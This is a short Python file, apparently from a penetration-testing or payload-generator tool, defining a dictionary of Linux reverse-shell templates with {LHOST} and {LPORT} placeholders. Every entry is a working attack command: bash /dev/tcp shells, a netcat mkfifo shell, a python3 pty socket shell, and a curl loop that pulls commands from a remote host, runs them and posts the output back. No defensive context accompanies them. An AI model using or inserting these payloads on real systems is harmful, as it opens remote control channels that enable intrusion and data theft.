# Linux payload templates with {LHOST} and {LPORT}

payloads = {
	"bash_tcp": {
		"template": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
		"transport": "tcp",
	},
	"bash_sh": {
		"template": "0<&196;exec 196<>/dev/tcp/{LHOST}/{LPORT}; sh <&196 >&196 2>&196",
		"transport": "tcp",
	},
	"nc_mkfifo": {
		"template": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f",
		"transport": "tcp",
	},
	"python3_pty": {
		"template": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{LHOST}\",{LPORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
		"transport": "tcp",
	},
	"curl_http_beacon": {
		"template": "while true; do curl -s -H 'Authorization: beacon-cmd' http://{LHOST}:{LPORT}/cmd | sh 2>&1 | curl -s -X POST -H 'Authorization: beacon-cmd' --data-binary @- http://{LHOST}:{LPORT}/out; sleep 5; done",
		"transport": "http",
	},
}